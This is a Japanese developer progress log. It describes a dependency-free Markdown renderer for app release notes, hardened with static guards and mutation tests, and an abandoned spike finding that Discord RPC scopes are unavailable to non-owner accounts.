   - **DL の進捗が進む**ことを確認 → ⚠ **install は押さない**（上記⑥）
   - **version を必ず戻す**（戻し忘れは `pnpm test` の `check:version` が検出する）
2. **security-review**（本セッションで実施予定）。
3. **コミットは未実施**（依頼者の明示指示待ち）。

## 2026-08-02 (055e リリースノートのマークダウン描画 —— 自前の最小レンダラ／**新規依存ゼロ**・055 系の完了)

[`docs/tasks/055e-release-notes-markdown.md`](tasks/055e-release-notes-markdown.md) を実装。
055c までプレーンテキスト（`white-space: pre-wrap`）で「`## 見出し`」がそのまま文字として見えていた
更新内容を、**見出し / 箇条書き / 太字 / インラインコード**として整形表示するようにした。
**新しい npm package はゼロ**（`package.json` / `pnpm-lock.yaml` は差分ゼロ）。

⚠ **タスクファイル (2) の記述は実装より古かった**。「`UpdateScreen.tsx` の描画箇所を置き換える」と
書かれていたが、055c が描画を `ReleaseNotes.tsx` へ切り出していたため、実際に差し替えたのは
**`ReleaseNotes.tsx` の 1 行**で **`UpdateScreen.tsx` は 1 バイトも変わっていない**（タスクファイル側も訂正済み）。

### ① 段落の分け方の決定と `white-space` の扱い

**1 行 = 1 ブロック**（連続する非空行を 1 つの `<p>` にまとめ**ない**）を採った。理由は 3 つ:

1. タスク (1) の表の字義どおり（「それ以外の行＝段落（`<p>`）としてそのまま」）。
2. **055c からの非退行**。いまは `pre-wrap` で改行がそのまま見えているので、連結する設計は
   「書き手が意図して割った行を黙ってつなぐ」＝**表示が変わる方向の変更**になる。
3. 055a の記録が既に行ごとを前提にしている（「`v0.1.0.md`: 箇条書きの折返し継続行〔…055e では
   **別段落に割れる**〕を解消し、1 行 1 項目にした」）。

⚠ 実データ `v0.1.0.md` は全段落が 1 行なので、**どちらを採っても出力は同一**。差が出るのは将来の書き方だけ。

**`white-space: pre-wrap` は残した。** 改行は DOM に残らないので「改行を見せる」効果は消えるが、
**行頭インデントを保つ**効果が残り、ネストしたリストやコードブロックの中身など
**対応外の記法を「消さない・壊さない」**に直接効く（外すとインデントが潰れる）。
横伸びは既存の `overflow-wrap: anywhere` が止めるので、残す副作用はない。
なお `check-css-guards.mjs` (8-b) は `max-height` / `overflow-y` しか見ないので、この宣言は自由に選べた。

### ② 対応した記法と、対応外をどう劣化させるか

| 記法 | 出力 |
| --- | --- |
| `# ` / `## ` / `### ` | `<h4>` / `<h5>` / `<h6>` |
| `- ` / `* ` | `<ul>` / `<li>`（連続する行だけを 1 つの `<ul>` に。ネスト非対応） |
| `**太字**` | `<strong>` |
| `` `コード` `` | `<code>` |
| 空行 | ブロックの区切り（箇条書きを閉じる） |
| それ以外の行 | `<p>` |

**対応外は「専用処理を一切書かない」ことで自動的に素の文字として残る**——表・引用・コードブロック（```）・
画像・水平線・ネストしたリスト・番号付きリスト・チェックボックス・**リンク**は、
ブロック解析のどの条件にも当たらず `<p>` に落ちる。＝「消さない・壊さない」を
**分岐で頑張るのではなく、書かないことで**達成している。

- **リンクは要素にしない**（`<a>` を 1 つも作らない）。外部 URL を開く経路を増やすと
  「外部から来た文字列に含まれる URL を開く」という新しい面が生まれるため。
  再修正トリガー＝踏ませたくなったら **https 限定 ＋ ホスト検証**を入れて別タスクにする。
- **崩れた入力は素の文字に劣化させる**。`**` / `` ` `` の閉じ忘れ、中身が空（`****` / ` `` `）は
  **記号を素の文字として吐いて先へ進む**＝どんな入力でも最悪プレーンテキストに落ちるだけで例外は出ない。
- **`` `**bold**` `` はコード span が先に閉じる**ので `**` は解釈しない（CommonMark と同じ優先順）。
  逆に **`**`code`**` は `<strong>` の中に `<code>`** ができる（`<strong>` の中身はコード span だけを
  解析する 2 段目に落とすので、**再帰は深さ 2 で必ず止まる**）。
- 走査は**左から 1 パス**で、正規表現の後戻りを使わない＝1 行が 20,000 字でも線形に終わる。

### ③ `clampNotes` を外側に残した形（055c review Q-4 の罠への対処）

呼び出しは **`renderReleaseNotes(clampNotes(notes))`**＝**先に打ち切ってからパースする**
（パーサに 20,000 字超を渡さない）。`ReleaseNotes.tsx` は「描画点」と「丈の制御」が同居しているため、
**書き直す形の作業をすると `clampNotes` が自然に消える**——それを 2 本で止めている:

1. `UpdateScreen.test.tsx` の **S-5**（上限値を上下から挟む）＝**消しても緩めても落ちる**。
2. `check-css-guards.mjs` の **(9-b)**＝`renderReleaseNotes(clampNotes(` という**呼び出しの形（順序）**を固定。
   S-5 は「打ち切られること」しか見ないので**順序までは固定できない**（パースしてから別の場所で切る
   書き方は緑のまま通る）。ここで初めて順序が固定される。

⚠ `<p>` → `<div>` に変えた（中身がブロック要素になったため）。**クラス名 `.notesBody` は変えていない**
——(8-b) はこのセレクタのルール本体を探すので、**リネームするとガードが黙って無効になる**。
逆向き（TSX 側でクラス名を変える）の穴は **(9-c)** で閉じた（(6-d) と同じ手口）。

### ④ 見出し等に採った実値とその出どころ（新しい値は発明していない）

タグは **`#`→`<h4>` / `##`→`<h5>` / `###`→`<h6>`**。画面が既に `<h2>`（ページ見出し）と
`<h3>`（`formLayout` の `.panelHead`）を使っているため。
⚠ `theme.css` のマージンリセットは **`h1..h4, p` までで h5 / h6 を含まない**ので、margin を明示している。
⚠ `v0.1.0.md` は `##` 始まりなので実際に出るのは h5 / h6（h4 を飛ばす）。
見出しレベルのスキップは WCAG の必須要件ではないので許容した。

| 対象 | 実値 | 出どころ |
| --- | --- | --- |
| h4（`#`） | 14px / 800 / `var(--text)` | `SettingsScreen.module.css` の `.optionLabel` |
| h5（`##`） | 13px / 800 / `var(--text)` | 本文と同じ 13px（`.notesBody`）＋ 項目名の 800（`.fieldLabel`） |
| h6（`###`） | 12px / 800 / `var(--text)` | `.fieldLabel` ＝ `formLayout.module.css` の `.field label` |
| ブロック同士の余白 | 14px | `.fields` の gap（＝`formLayout.module.css` の `.form`） |
| ブロック内の余白 | 7px | `.fieldLabel` の margin-bottom（＝`.field label`） |
| `<ul>` の字下げ | 18px | `formLayout.module.css` の `.panelBody` の padding |
| `<code>` の意匠 | mono / `var(--control-bg)` / `var(--border-soft)` / radius 6px / padding 1px 6px | `DiagnosticsScreen.module.css` の `.code`（error code チップ） |
| フォールバック文言 | `var(--muted)` | 054 の階層規則（補足＝`--muted`） |

⚠ **`<code>` の font-size だけ `.code` の 10px を採らず 12px**（`.fieldLabel` と同値）。10px は独立した
チップ用のサイズで、13px の本文に混ぜると小さすぎるため。他の宣言は `.code` と 1 文字も違わない。
⚠ **`<code>` の背景に新トークンは要らなかった**——`--control-bg` ＋ `--border-soft` が
`DiagnosticsScreen .code` / `.summaryArea` / `formLayout .field input` で使われている既存の役割トークンで、
`color-mix(--color-text 6%, transparent)` なので両テーマ追従する。**生 hex / rgba は 1 つも書いていない。**
⚠ 054 の 13px/700 は持ち込んでいない（あれはコメビュ窓の中の局所的な結論）。

### ⑤ `dangerouslySetInnerHTML` を使っていないことの担保方法

**テストでは検査にならない。** React 要素しか組まない以上「レンダリング結果に生 HTML が混ざらない」は
**構造的に必ず通る**＝空虚で、ミューテーションでも殺せない。止めたいのは
「将来それが**足される**こと」なので、担保は **`check-css-guards.mjs` の (9)**（ソース文字列の静的検査）に置いた。

⚠⚠ **この段落の前提は誤りだった（⑦ のレビューで訂正）。** 実測では `dangerouslySetInnerHTML` を足す変異も
`createElement("a", { href })` で needle を回避する変異も**ランタイムのテストが殺し、静的ガードのほうが
すり抜けた**。＝ランタイム側は空虚ではなく、(9) が担うのは**描画結果に現れないのにソースには現れる**追加
（別ファイルへの追加・needle 回避・clamp の順序）。**両方が要る**。以下の記述はこの訂正を前提に読むこと。
先例は同ファイルの (4) / (6-d)（TSX を照合）と Rust の `app_update/commands.rs` の `command_contract`。

- **(9-a)** `renderReleaseNotes.tsx` / `ReleaseNotes.tsx` / `UpdateScreen.tsx` の 3 本に
  `dangerouslySetInnerHTML` / `openUrl` / `plugin-opener` / `window.open` / `<a ` / `href=` /
  `http` / `src=` / `url(` が現れないこと。
- **(9-b)** `renderReleaseNotes(clampNotes(` の呼び出しの形（＝順序）。
- **(9-c)** `styles.notesBody` の参照（CSS↔TSX の逆向き）。

⚠ 照合は **`stripTsComments()` を通した後**。`ReleaseNotes.tsx` の JSDoc は
「`dangerouslySetInnerHTML` を使わない」と**書いている**ので、剥がさないと**正しいコードで落ちる**。
本スクリプトは**自分自身を読まない**ので、needle をここに書いても自己ヒットはしない
（Rust の `command_contract` が踏んだ罠はここでは起きない）。
⚠ needle に `https://` ではなく **`http`** を使っている——`stripTsComments` が `//` 以降を落とすため
`const u = "https://…"` が `const u = "https:` に化けて**すり抜ける**（実際に確かめて `http` に変えた）。
⚠ **新しい .mjs に分けなかった**のは、`package.json` に `check:*` を 1 行足すと
「新規依存ゼロ＝`package.json` 差分ゼロ」の担保が崩れるため（`pnpm test` は既に `check:css` を呼ぶ）。

**ミューテーション 6/6 で実効性を実証**（変異 → 実行 → 復元）:

| 変異 | 結果 |
| --- | --- |
| コード行の `clampNotes(` を外す（`renderReleaseNotes(notes)`） | (9-b) が FAIL |
| `clampNotes` は残したまま順序を逆にする（パースしてから別途 clamp） | (9-b) が FAIL |
| `dangerouslySetInnerHTML` で描画する | (9-a) が FAIL |
| TSX 側のクラス名だけ `styles.notesArea` に変える（CSS は `.notesBody` のまま） | (9-c) が FAIL |
| `<code>` を `<a href="x">` に変える | (9-a) が FAIL |
| `.notesBody` の `max-height` を消す（既存 (8-b) の非退行） | (8-b) が FAIL |

⚠ **1 回目の測定は誤りだった**。`clampNotes` を外す変異が「生存」と出たが、真因は
**`perl s///` が最初の一致＝コメント側を書き換えていた**（`renderReleaseNotes(clampNotes(` は
このファイルに 3 回現れ、うち 2 回はコメント）＝**コードは変異していなかった**。
コード行を名指しして測り直したら両方 killed。**「生存」を見たらまず変異が当たっているかを疑うこと。**

⚠ 併せて **`clampNotes` を外すと `UpdateScreen.test.tsx` の S-5 も落ちる**ことを実測で確認した
（2 段構えの両方が独立に効いている）。

⚠⚠ **この 6 種は変異の選び方が偏っていた（⑦ のレビューで判明）。** すべて「ガード自身が主張していること」を
裏返しただけで、**パーサのブロック境界（`flushList` の呼び出し）と属性への流入を 1 つも突いていない**。
レビュー側が独自に回した 10 種で**生存変異が 3 件**見つかった（⑦ の表）。
**教訓: 自分のガードの主張を確かめる変異だけでは、ガードが見ていない領域の穴は永久に見つからない。**

### ⑥ `v0.1.0.md` を通した結果

**実際に配られる唯一のリリースノート**（055a の CI が `latest.json` の `notes` にそのまま流す）を
`?raw` で読み込んで**テストに直接通した**。
⚠ `?raw` は CSS モジュールには効かない（Vite の CSS 処理が先に勝つ）が、**`.md` は前処理と衝突しない**。
型は `src/vite-env.d.ts` の `/// <reference types="vite/client" />` が `*?raw` を `string` と宣言している
＝**新規依存ゼロ**。スナップショットではなく**構造アサーション**にした（読んで意図が分かる）。

- `##` 4 本 → `<h5>` **4 個**、`- ` 18 本 → `<li>` **18 個**、`<strong>` が 1 個以上。
- 描画結果の textContent に **`**` も `#` も残らない**。`<a>` / `<img>` は **0 個**。
- 期待値は**ファイルから正規表現で数えている**ので、`v0.1.0.md` を書き換えても
  「実データと実装が一致しているか」を見続ける（数字をベタ書きしていない）。
- 前提テスト（「実データが見出しと箇条書きと `**` を含む」）を別に 1 本置いた
  ——これが無いと、将来ファイルが空になったときに **0 個 == 0 個で空虚に緑**になる。

⚠ **⑦ で `v0.1.0.md` の直 import を `import.meta.glob("…/v*.md")` に変えた**（レビュー Q-6）。
上の形はファイル名がベタ書きなので、**v0.2.0 が出た瞬間に「実際に配られるデータ」という前提が崩れ、
古いファイルだけを検証し続ける**。glob なら以後のリリースノートが自動で対象に入る。
併せて `not.toContain("#")` は「**記法として書いた行がそのまま残っていない**」の突き合わせへ変えた
（将来「#1 の不具合」のように本文で `#` を使いうるため）。

### 変更・新規ファイル

**新規 2**: `apps/desktop/src/screens/app-update/renderReleaseNotes.tsx`（純関数）／`renderReleaseNotes.test.tsx`。
**変更 4（コード）**: `ReleaseNotes.tsx`（1 行差し替え＋フォールバック）／`UpdateScreen.module.css`
（`.notesBody` の**子孫セレクタ**のみ追加＋`.notesEmpty`）／`UpdateScreen.test.tsx`／`scripts/check-css-guards.mjs`。
**変更 5（docs）**: `docs/release-notes/README.md` / `docs/security.md` §10 / `docs/progress.md` /
`docs/tasks/055e-release-notes-markdown.md` / `docs/task-board.md`。

**差分ゼロを維持**: `UpdateScreen.tsx` ／ `package.json` ／ `pnpm-lock.yaml` ／
`apps/desktop/src-tauri/` ／ `apps/comment-sidecar/` ／ `.github/` ／ `theme.css`。

### ⚠ `UpdateScreen.test.tsx` は「触らない」では済まなかった

タスクの想定は「`UpdateScreen` にケースを 1 つ足す」だったが、**055c 前提の 2 本が整形と両立しない**:

- 「更新内容は改行を保持したプレーンテキストで出す」… `textContent).toBe(notes)` /
  `toContain("\n")` / `toContain("## 0.1.0")` の 3 つとも落ちる → タスク (4) が要求する
  「見出しと箇条書きが要素として出る」テストへ**書き換えた**。
- 「通常の長さの notes は 1 文字も削らない」… `toBe(notes)` が落ちる →
  「`以下省略` を含まない ＋ 記号を除いた中身が 1 文字も欠けていない」へ書き換えた。
- 「現在バージョン・新バージョン・更新内容を表示する」… `getByText("0.1.0")` が
  **`<span class=fieldValue>` と新設の `<h5>0.1.0</h5>` の 2 件**に当たって落ちた
  （テスト用 notes が `## 0.1.0` で始まるため）。**値スロットに限定**して直した
  （`{ selector: '[class*="fieldValue"]' }`）＝「新しいバージョンの**値**として出ている」まで固定でき、**精度は上がった**。

**触らずに通ったもの**（意図的に温存）: **S-5**（clamp 後は `"あ"×20000` ＋ `"…（以下省略）"` の 2 行 →
textContent が **20,007 字**で `>= 20000 && < 20100` を満たす）／`<img>`・`<b>` の非解釈テスト／
§9 全状態の網羅（`notes: "- 不具合を修正"` → `<li>`）／`notes` が `null` なら行ごと出さない。

### 検証結果

`pnpm --filter ./apps/desktop typecheck` / `lint` / `test` すべて緑。
**31 files / 588 tests**（055d 時点の 555 → **+33**）。`check:css`（(8-b) と新設 (9)）・`check:version` も OK。
⚠ この時点の数字。⑦ のレビュー反映後は **592 tests**。

### ⑦ security-review / 品質レビュー実施（2026-08-02）と、その反映

**判定: 軽微な懸念あり（修正必須ゼロ）**。未署名データの扱い・新規依存ゼロ・ゼロ拡大はすべて実測で確認
（`package.json` / `pnpm-lock.yaml` / `src-tauri` / `comment-sidecar` / `.github` / `theme.css` /
`UpdateScreen.tsx` 差分ゼロ、`cargo check` exit 0、コメント除去後の needle 0 件、CSS の実値が
すべて既存ファイル由来であることを 1 つずつ照合）。指摘は**ガードとテストの実効範囲**に集中した。

⚠ **レビュー側が独自にミューテーションを 10 種回し、⑤ の 6/6 に入っていなかった生存変異を 3 件見つけた。**
＝ ⑤ の測定は「ガード自身が主張していること」しか変異させておらず、**パーサのブロック境界と
属性への流入を 1 つも突いていなかった**。「自分が書いたガードの主張を確かめる変異」だけでは足りない。

| 生存していた変異 | 何が起きるか | 対応 |
| --- | --- | --- |
| 見出し分岐から `flushList()` を削除 | 見出しが箇条書きより**先**に出て、見出しをまたいだ項目が 1 つの `<ul>` に融合 | テスト追加（ブロック順序を `["UL","H5","UL","P","UL"]` で固定） |
| 段落分岐から `flushList()` を削除 | 同上（段落版） | 同上のテストが両方を殺す |
| `notes` を `title=` / `style={{…}}` へ流す | **描画結果は壊れて見えない**のに外部リソース取得が成立しうる（`style` の CSS 値を React はサニタイズしない） | テスト追加（**組み立てた要素の属性が 0 個**） |

⚠ **⑤ の「ランタイムのテストは空虚＝ミューテーションでも殺せない」は誤りだった。** 実測では
`dangerouslySetInnerHTML` を足す変異も `createElement("a", { href })` で needle を回避する変異も
**ランタイムのテストが殺し、静的ガードのほうがすり抜けた**。正しい役割分担は
「ランタイム＝**描画結果に現れる**違反」「(9)＝**描画結果に現れないのにソースには現れる**追加」で、
**両方が要る**。`renderReleaseNotes.tsx` / `ReleaseNotes.tsx` / `check-css-guards.mjs` / `security.md` の
4 箇所に書いていた誤った根拠を訂正した（**ランタイム側を「どうせ空虚だから」と消さないこと**）。

**反映した修正**:

- **(9-a) をファイル名 3 本の列挙から `src/screens/app-update/` のディレクトリ走査へ**（`*.test.tsx` 除外）。
  当初は **`dangerouslySetInnerHTML` を同ディレクトリの新規ファイルへ置くだけでガードが緑のまま通った**。
  「将来足されること」を止めるのが目的なら、**ファイルを足すという最も自然な足し方**に穴があってはいけない。
- **needle をファイル種別で分けた**。生 HTML / リンク系 6 つは配下**全ファイル**、外部リソース系
  （`http` / `src=` / `url(`）は**レンダラ本体 2 本のみ**。後者を画面全体に課すと、将来この画面が
  正当な理由で `src=` を使った瞬間に**正しいコードで落ちる**（申し送り 6 の懸念をここで解消）。
- **レンダラ本体 2 本が「在ること」自体を要求**（走査方式にした副作用で ENOENT では落ちなくなったため）＋
  `readSource()` で **ENOENT を生スタックトレースではなくガードの失敗メッセージにした**（(5-b) の原則）。
- **`?raw` の直 import を `import.meta.glob("…/v*.md")` へ**。ベタ書きだと v0.2.0 が出た瞬間に
  「実際に配られるデータ」という前提が崩れ、**古いファイルだけを検証し続ける**。
  併せて `not.toContain("#")` を「**記法として書いた行がそのまま残っていない**」の突き合わせに変えた
  （将来「#1 の不具合」のように本文で `#` を使いうるため）。
- **「1 文字も削らない」の期待値をフィクスチャから導出**（手で連結した literal だと、notes を変えた人が
  literal を書き換えて辻褄を合わせる形で担保が静かに緩む）。
- **`allowStrong` の JSDoc を訂正**。`end = indexOf("**", i + 2)` は**最初の**出現なので
  `slice(i + 2, end)` は構造的に `**` を含み得ず、**旗が無くても再帰は 2 段で止まる**
  （旗を `true` にしても挙動が変わらない＝等価変異であることを実測）。旗は保険として残す。

⚠ **反映作業中にもう 1 件見つかった**（⑤ の 6/6 の測定漏れ・**元コードからある性質**）。⑤ の表の
「TSX 側のクラス名を `styles.notesArea` に変える → (9-c) が FAIL」は、**2 箇所ある `styles.notesBody` を
両方変えた場合**の結果だった。`ReleaseNotes.tsx` には本体の `<div>` と空 notes のフォールバック `<p>` の
**2 箇所**があり、**本体だけ変えるともう片方が残って (9-c) は通る**（実測）。
needle を `className={styles.notesBody}` の形まで狭める案は、本体に正当な理由で 2 つ目のクラスが付いた瞬間に
**正しいコードで落ちる**（(5-b) と同型）ので採らず、**`UpdateScreen.tsx` の複数テストが
`[class*="notesBody"]` で本体を引いている**ことで殺せる（実測で killed）ことを確認して**修正不要**とした。
(9-c) のコメントにこの限界と再修正トリガー（`[class*="notesBody"]` の参照が消えるとき）を明記した。
＝ここでも「描画結果に現れる違反はランタイム側の担当」という ⑦ の役割分担どおりになっている。

**修正不要と判断してコメントを残したもの**: (9-b) がデコイで迂回できる点（S-5 テストが独立に殺すため。
再修正トリガー＝S-5 を弱める変更が入るとき）／見出しレベルの h4 スキップ（WCAG の達成基準ではなく
Technique。既存 `v0.1.0.md` と食い違うので書き方は動かさない）／`clampNotes` の `slice` が
サロゲートペアを割りうる点（到達条件が「latest.json が壊れている」＝上限に当たること自体が異常の合図）／
`check-css-guards.mjs` の改名（`package.json` を触るため差分ゼロ要件と衝突・別タスクへ）。

**再検証**: `typecheck` / `lint` / `test`（31 files / **592 tests**）/ `check:css` / `check:version` / `cargo check` すべて緑。
生存していた 3 変異が**すべて killed** になること、新規ファイル経由の迂回とリネームが (9) で落ちることを実測。

### 未完了・次にやること

1. **実機確認（依頼者）** —— ⚠ エンドポイントは draft の間 404 なので、`notes` の実物を画面で見るには
   **publish 済みリリースが要る**（055c / 055d と同じ事情）。
   ただし **`v0.1.0.md` を通すテストが `pnpm test` で回っている**ので、
   「実際に配られる文字列が例外なく整形される」ことは**機械で確認済み**＝実機に残るのは**見た目**だけ:
   見出し / 箇条書き / 太字 / インラインコードの整形 ／ 対応外の記法が文字として残る ／
   長い 1 行でも横に伸びない・`max-height` を超えたらスクロールする ／ **ライト・ダーク両方で読める** ／
   **右下のアップデートボタンが画面外に押し出されない**。
   publish 前に見た目だけ見るなら、`App` が `UpdateScreen` へ渡す `status` を固定値にする
   **ローカル 1 行の仮変更（コミットしない）** がいちばん副作用が小さい。
   ⚠ `tauri dev` で「アップデート」ボタンは**押さない**（`extract_path` が `src-tauri/target/debug` を
   指すためビルドツリーが消える・055d の申し送り）。
2. ~~**軽レビュー**~~ **実施済み（⑦）**。security-review ＋ 品質レビューを実施し、指摘は反映済み。
3. **コミットは未実施**（依頼者の明示指示待ち）。⚠ **055a〜055d は `96f46d2` までで既にコミット済み**なので、
   作業ツリーの差分は **055e ぶんだけ**（＝レビューの base は `96f46d2`）。
   **055 系（055a〜055e）はこれで全サブタスクの実装が完了**——残るのは実機確認と 055e のコミット。
   ⚠ task-board / progress の 055c・055d 節に残る「未コミット」表記は**コミット前に書いた記述で、いまは古い**
   （実害は無いので 055e では触っていない）。

## 2026-08-02 (057s Discord RPC ＋ StreamKit スパイク：**中止**＝非所有者では RPC スコープが払い出されず配布不可)

Discord コラボ配信 自動オーバーレイ（057）の生死を実測で決めるスパイク（本実装 057a/057b/057c はしない）。
**結論＝⚠「承認が要る／配布不可」**で、親 [057](tasks/057-discord-voice-overlay-design.md) の中止条件（本人決定・2026-08-02）を発動し、
**057 系ごと [docs/task-board.md](task-board.md) の `## 保留` へ移した**。検証は**リポジトリ外の単体スクリプト**（`~/057s-spike`・
`ws` / `obs-websocket-js` はスクラッチパッド側にのみ導入）で行い、**本体コード・依存・host-guard は未改変**（検証コードは破棄・本体マージ無し）。
Developer Portal の操作・Discord/OBS の GUI 操作・**アカウント切替**・目視は本人が担当。

- **実測環境**: macOS 14.6.1 (23G93) / Apple M3 Pro / Node v22.12.0 / OBS **32.2.1** / obs-browser 2.26.9 / CEF 127.0.6533.120 /
  obs-websocket 5.7.4。Discord Application は**新規登録・team 非所属**。IPC 実測パスは **`$TMPDIR/discord-ipc-0`**（`/tmp` 直下には無い）。
  アカウント **A＝Application の所有者** ／ **B＝所有者でも App Tester でもないサブアカウント**。
- **(1) 承認要件 ＝ ⚠（本スパイクの主目的・3 択の真ん中）**: `AUTHORIZE` の実測で
  **`rpc` は A で成功・B で `5000 "OAuth2 Error: invalid_scope: The requested scope is invalid, unknown, or malformed."`**、
  **`rpc.voice.read` は A でも B でも `5000`**。⚠ **親 057 が期待した「Public 表記のサブスコープに逃げる」道は存在しなかった**
  （現行公式ドキュメントでも `rpc.voice.read` は `rpc` と同じ "only available to approved partners"。「Public: Yes」の記述は無い）。
  **対照実験の `identify` は A/B とも成功**＝接続もアプリ設定も壊れておらず、拒否されているのは **RPC 系スコープだけ**と確定。
  同じ `client_id`・同じマシン・同じスクリプトで**変えたのはログイン中のアカウントだけ**。
  **OAuth を迂回する道も無い**（`HANDSHAKE`/`READY` のみで `GET_SELECTED_VOICE_CHANNEL` / `GET_VOICE_SETTINGS` / `GET_CHANNELS` /
  `GET_GUILDS` / `SUBSCRIBE VOICE_CHANNEL_SELECT` を叩き **5 コマンドすべて `4006 "Not authenticated or invalid scope"`**）。
  Portal の現況＝**RPC whitelist の独立欄は無く実体は App Testers（50 枠）**・**一般承認の申請窓口は公開されていない**。
- **(2) OAuth の形 ＝ ⚠（部分実測・打ち切り）**: `code_challenge`/`code_challenge_method` を付けても `AUTHORIZE` はエラーにならず
  認可コードが返る（`identify` で確認）。ただし**受理か黙殺かは不明**で、**PKCE 可否の本判定（secret 抜き＋code_verifier で交換できるか）は未実測**。
  **client_secret は本スパイクを通じて一度も作成・使用していない**（(1) の判定は `AUTHORIZE` の応答だけで付くため）。
- **(3) RPC の実挙動 ＝ 未実測**（打ち切り規則により停止）。ただし副産物として:
  **ソケットファイルは Discord 終了後も残る**（＝存在は起動の証拠にならず `ECONNREFUSED` の graceful 処理が必須）、
  **接続を張り直すと次の HANDSHAKE が無応答になる**（7 回中 5 回 READY タイムアウト → **1 接続に集約して安定**。057a は常駐 1 接続設計にすべき）。
- **(4) transport ＝ ✅ IPC 採用**: WS は **`4001 "Invalid Origin"`** で `rpc_origins` 登録が必須、IPC は Origin 検証なしで READY 到達・
  **新規依存ゼロ**（`node:net`）。`-1`〜`-9` へのフォールバックは当環境では発生せず（`-0` のみ実在）。
  フレームは `opcode(u32 LE)+length(u32 LE)+JSON`、**CLOSE(op 2) と FRAME(op 1) は別扱い**（無効 client_id は op2 `4000 "Invalid Client ID"`）、
  **部分受信の再組立が必須**。⚠ **Windows 未検証**（`\\?\pipe\discord-ipc-N`・実装のみ・098 VM 待ち）。
- **(5) StreamKit URL の描画条件 ＝ ✅**: **自分が管理者でないサーバー**（サブ垢が作成・本人はロール無しの一般メンバー）で参加者が描画された。
  **ウィジェット無効・非コミュニティ・非公開のまま**＝**隠れた前提なし／コラボ相手に設定を頼む必要なし**。誰もいない VC は**空表示**（エラーにならない）。
  ⚠ 限界＝**サブアカウントが作成したサーバー**での検証であり、真に第三者が運用するサーバーでは未検証。
- **(6) OBS ブラウザソース ＝ ✅（前提が 1 つ）**: ⚠⚠ **044s の未描画症状が再現したが、原因は方式ではなく OBS の設定だった。**
  CEF は初期化済み（GPU ヘルパー起動）だが **renderer プロセスが皆無・CEF キャッシュ書き込みゼロ**＝**読み込みが始まってすらいない**。
  インストールは健全（全ヘルパー存在・`codesign --verify --deep --strict` exit 0・隔離属性なし）。
  **OBS 既定の `https://obsproject.com/browser-source` すら真っ黒**だったため StreamKit/URL スキームとは無関係と切り分け、
  **`global.ini` の `BrowserHWAccel=true` を OFF にして再起動したら描画された**。
  → ⚠ **[044s](tasks/044s-obs-websocket-spike.md) の「方式 B は未描画」も同じ 1 台・同じ設定だった可能性が高い**
  （044s の方式 A 採用自体は覆さないが、「ブラウザソースは使えない」と一般化しないこと）。
  その他: **`SetInputSettings` の URL 差し替えだけで再読込 ✅（`refreshnocache` 不要）**／`GetInputList` で重複作成防止 ✅／
  作成先は `currentProgramSceneName`／`SetSceneItemEnabled` で表示切替 ✅／既定は**背景透過 css**・`shutdown:false`・`width 800/height 600`。
  ⚠ **`webpage_control_level` の既定は `1`**＝埋め込みページに OBS ステータス読取を許す。**第三者サイトを載せるので `0` へ落とすこと**（057b で対処）。
- **通信面**: 検証の外部 egress は **`discord.com`（OAuth）のみ**。`streamkit.discord.com` へ取りに行くのは **OBS のブラウザソースであってスクリプトではない**
  （＝親 057 の「StreamDock の egress は増えない」という主張の裏付け）。OBS は `127.0.0.1:4455`、RPC は unix ソケット／`127.0.0.1:6463` の loopback のみ。
- **成果物（ドキュメントのみ）**: [docs/tasks/057s-discord-rpc-streamkit-spike.md](tasks/057s-discord-rpc-streamkit-spike.md)（末尾に**スパイク結果＋決定メモ**・状態行を「完了（結論＝中止）」へ）／
  [docs/tasks/057-discord-voice-overlay-design.md](tasks/057-discord-voice-overlay-design.md)（状態行を「保留」へ・中止条件の直下に**「発動の記録」**を新設）／
  [docs/task-board.md](task-board.md)（057 ブロックを `## Next` → `## 保留` へ移動＋結論 1 行。Todo の方式 B にも申し送り 1 行）／本エントリ。
  **[docs/security.md](security.md) は未編集**（中止のため追記する例外が無い）。
  ⚠ **057a / 057b / 057c は本スパイクより前に既に起票済み**だったため、**内容は変更せず状態行だけを「保留」に更新**した
  （057a＝着手条件を満たさず・`rpc.voice.read` 前提の設計は再開時に要書き直し／**057b＝着手条件 (5)(6) は満たしているが ID の供給元が無く保留・実測値を状態行に転記**／057c＝057a に連動）。
- **半自動版（ID を手登録 → OBS へ自動反映）を再検討し、改めて却下（本人決定・2026-08-02）**: 「自動反映が無理でも URL の自動生成だけなら」を検討したが**作らない**（親 057 の中止条件 1 つ目を維持）。URL の可変部は `guild_id`/`channel_id` の 2 つだけで **(5)(6) が ✅ なので OBS 側は完全自動になる**ものの、**チャンネル一覧が user の OAuth トークンでは取得できない**（Bot か RPC が要る）ため **VC は必ず手入力**になる。サーバー一覧は `guilds`（公開スコープ）で取れる見込みだが**未検証**。Guild Widget JSON は**サーバー側の有効化が必要**＝コラボ相手に頼むことになり目的に反する。⚠ StreamKit のサイトがサーバー/VC を選ばせられるのは**あのサイト自身が承認済みアプリとしてローカル RPC を使っている**ため（OBS のブラウザソースが当該ページを読み込んだ際にDiscord の同意モーダルが出たことで裏付け）＝**非承認アプリで同じことをする道は無い**。⚠ **当初の却下は「半分 vs 全部」の比較、今回は「半分 vs ゼロ」の比較**だったが、**チャンネル手入力が残る以上「VC を探す負担を消す」という芯が解消されない**ため却下を維持した。**再検討のトリガー＝「VC の指定は手作業でよいから OBS 反映だけ自動化したい」という要望が実際に出たとき**（そのときは `guilds` の非所有者実測から始める）。
- **再開条件と粒度**: **Discord の RPC 承認が下りたとき**（または `rpc.voice.read` が実際に Public として払い出されたとき）。
  ⚠ **申請窓口が公開されていないため見込みは高くない**（先行事例 voice-channel-grabber も承認を取れていない）。
  再開時は **(1)(4)(5)(6) は測り済み**なので **057s の (3) と (2) の残りから**再開してそのまま 057a へ。**057b は (5)(6) だけで先行着手できる。**
  ⚠ **再開しても使えるのは `rpc`（ローカル Discord クライアントの制御権限）**であって `rpc.voice.read` ではない＝
  **security.md §3（最小権限）に照らして「この広さを受け入れるか」を親 057 で再判断すること。**
- **やらないこと（線引き）**: 本実装（057a/057b/057c）・検証コードの本体マージ・新規依存の本採用・security.md 本体の編集・
  Discord への承認申請そのもの（申請するかは本人判断）・コミット/プッシュ（本人の明示指示待ち）。
- **⚠ 検証中の事故（記録）**: 検証スクリプトの自作サマリでキー名を `errorCode` としたフィールドに `data.code` をそのまま入れており、
  **成功時の認可コードが平文で出力された**（4 件）。`data.code` は「成功時＝認可コード（機密）／失敗時＝エラーコード（数値）」の**両義フィールド**である。
  実害は無い（認可コードは単回使用・短命で、交換には未漏洩の `client_secret` が必要）が、
  **キー名ベースの伏せ字は「想定したキー」しか守れない**という教訓として残す。対処＝キー名に依存しない網
